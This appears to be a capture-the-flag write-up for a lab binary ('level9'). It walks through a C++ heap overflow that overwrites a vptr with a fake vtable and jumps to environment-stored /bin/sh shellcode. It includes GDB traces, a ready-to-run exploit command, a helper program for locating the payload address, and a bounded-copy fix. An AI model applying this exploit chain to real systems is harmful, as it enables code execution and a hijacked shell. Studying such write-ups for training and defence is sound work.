# Level9 — C++ Exploitation Concepts (Visual & Clear)

## Overview

Attack chain:

**Heap overflow → vptr overwrite → fake vtable → shellcode in env**

---

## 1. Heap Overflow

### Vulnerability

```c
memcpy(this + 4, src, strlen(src));
```

No bounds checking → overflow possible.

### Memory Layout

```
[ Object 1 ]
  vptr
  annotation[100]
  int

[ Object 2 ]
  vptr   ← TARGET
```

### What happens

Input written at `premier + 4` flows into `second->vptr`.

### Result

We can overwrite the second object's vptr.

---

## 2. vptr Overwrite

### What is vptr?

```
object
 ├── vptr → vtable
 └── data
```

### Virtual call

```cpp
obj->func()
```

Becomes:

```
func = obj->vptr[0]
call func
```

### Exploit idea

Overwrite `second->vptr`.

### Result

We control where the program looks for the function.

---

## 3. Fake vtable

### Normal vtable

```
vtable:
  [0] = function1
  [1] = function2
```

### Fake one

We force:

```
second->vptr = premier + 4
```

### Memory

```
premier + 4:
  [0] = addr_shellcode
  [1] = junk
```

### Execution (GDB)

```
eax = second->vptr
edx = *(eax)
call edx
```

### Result

Program jumps to our shellcode.

---

## 4. Shellcode in Environment

### Why env?

- argv used for overflow
- need stable executable memory

### Solution

Store shellcode in env:

```
PAYLOAD = NOP sled + shellcode
```

### Benefits

- stable address
- large space
- easy to find in GDB

---

## Final Chain

```
1. Overflow → reach second object
2. Overwrite vptr → point to controlled memory
3. Fake vtable → contains shellcode address
4. Virtual call → jumps to shellcode
```

### Mental model

Program: "Give me function table"  
Attacker: "Here it is 😈"  
Table: "→ shellcode"

---

## Memory layout (objects a & b)

```
a:
+0x00  vtable
+0x04  annotation[100]
+0x68  value

b:
+0x00  vtable   ← target
+0x04  annotation[100]
+0x68  value
```

### Struct N

```c
typedef struct s_n {
    void *vtable;          // 4 bytes
    char annotation[100]; // starts at offset 4
    int value;
} N;
```

### Heap layout (bytes)

```
[ a chunk header : 8 bytes ]
[ a->vptr : 4 bytes ]
[ a->annotation : 100 bytes ]
[ a->value : 4 bytes ]
[ b chunk header : 8 bytes ]
[ b->vptr : 4 bytes ]
[ b->annotation : 100 bytes ]
[ b->value : 4 bytes ]
```

So:

```
a = 0x0804a008
a->annotation = a + 4 = 0x0804a00c
```

---

## GDB — main disassembly

```bash
0x08048650 <+92>:   mov    %ebx,0x18(%esp)
0x08048654 <+96>:   mov    0x1c(%esp),%eax
0x08048658 <+100>:  mov    %eax,0x14(%esp)   ; a
0x0804865c <+104>:  mov    0x18(%esp),%eax
0x08048660 <+108>:  mov    %eax,0x10(%esp)   ; b
```

Breakpoint after a and b are set:

```bash
(gdb) break *0x08048664
(gdb) run AAA
(gdb) x/wx $esp+0x14
0xbffff724:     0x0804a008
(gdb) x/wx $esp+0x10
0xbffff720:     0x0804a078
```

---

## GDB — virtual call

```bash
0x0804867c <+136>:   mov    0x10(%esp),%eax   ; eax = b
0x08048680 <+140>:   mov    (%eax),%eax       ; eax = b->vptr
0x08048682 <+142>:   mov    (%eax),%edx       ; edx = *(b->vptr)
...
0x08048693 <+159>:   call   *%edx
```

Breakpoint before the call:

```bash
(gdb) break *0x08048693
```

After overflow: `b->vptr = 0x0804a00c` (first+4), so `*(b->vptr) = *(0x0804a00c) = 0xbffffc03` (shellcode address).

---

## Payload argv[1]

```
[ a->annotation first 4 ][ padding to b->vptr ][ overwrite b->vptr ]
[ 03 fc ff bf          ][ 42 42 42 42 ...         ][ 0c a0 04 08       ]
```

In Python:

```bash
"\x63\xfc\xff\xbf"   → shellcode address (little-endian)
"B"*104              → padding
"\x0c\xa0\x04\x08"   → first+4 (new b->vptr)
```

Command:

```bash
./level9 $(python -c 'print "\x03\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
```

(Adjust shellcode address from GDB; often `\x63\xfc\xff\xbf` for 0xbffffc63.)

---

## NOP sled

**NOP sled** : [NOP slide (Wikipedia)](https://en.wikipedia.org/wiki/NOP_slide)

Séquence d’instructions NOP (`\x90` on x86) placed **before** the shellcode. An imprecise jump into this region still hits the shellcode.

```
[ shellcode ]
        ↑
        must land EXACTLY here ❌

[ NOP NOP NOP NOP NOP NOP NOP NOP ][ shellcode ]
  ↑         ↑           ↑
  all these addresses work ✅
```

| Size          | Effect                |
| ------------- | --------------------- |
| 10–50 bytes   | low tolerance         |
| 100–500 bytes | reasonable            |
| 1000+ bytes   | very robust (level9)  |

`getenv("payload")` returns the **start** of the value (start of the NOP sled). Several addresses in the region are valid (e.g. 0xbffffc03, 0xbffffc63).

Process memory:

```
High address
┌───────────────────────────────┐
│   ENVIRONMENT                 │
│   payload=NOP+shellcode        │  ← shellcode here
├───────────────────────────────┤
│   ARGUMENTS (argv)             │
│   argv[1] = overflow          │
├───────────────────────────────┤
│   STACK                        │
├───────────────────────────────┤
│   HEAP                         │
├───────────────────────────────┤
│   .bss / .data                 │
├───────────────────────────────┤
│   CODE (.text)                 │
└───────────────────────────────┘
Low address
```

---

## Helper — payload address

To print the address of `payload` in the env (without GDB):

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    char *p = getenv("payload");
    printf("payload at: %p\n", p);
    return 0;
}
```

On the VM:

```bash
scp -P 4242 helper.c level9@localhost:/tmp
# on the VM:
gcc /tmp/helper.c -o /tmp/helper
env -i payload=$(python -c 'print "\x90"*1000 + "AAAA"') /tmp/helper
# e.g. output: payload at: 0xbffffc03
```

See `Ressources/helper.c`.

---

## Shellcode used

**Linux x86 execve("/bin/sh") — 28 bytes**  
Reference: [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html) (Jean Pascal Pereira).

Instruction-by-instruction explanation: `shellcode_pas_a_pas.md`.  
Summary and bytes: `shellcode.md`.

---

## Program-side fix

Replace the unbounded memcpy with a bounded copy, for example:

```c
memcpy(this->annotation, s, strlen(s));
```

→

```c
size_t n = strlen(s);
if (n >= sizeof(this->annotation)) n = sizeof(this->annotation) - 1;
memcpy(this->annotation, s, n);
this->annotation[n] = '\0';
```

"Never copy more than 100 bytes."
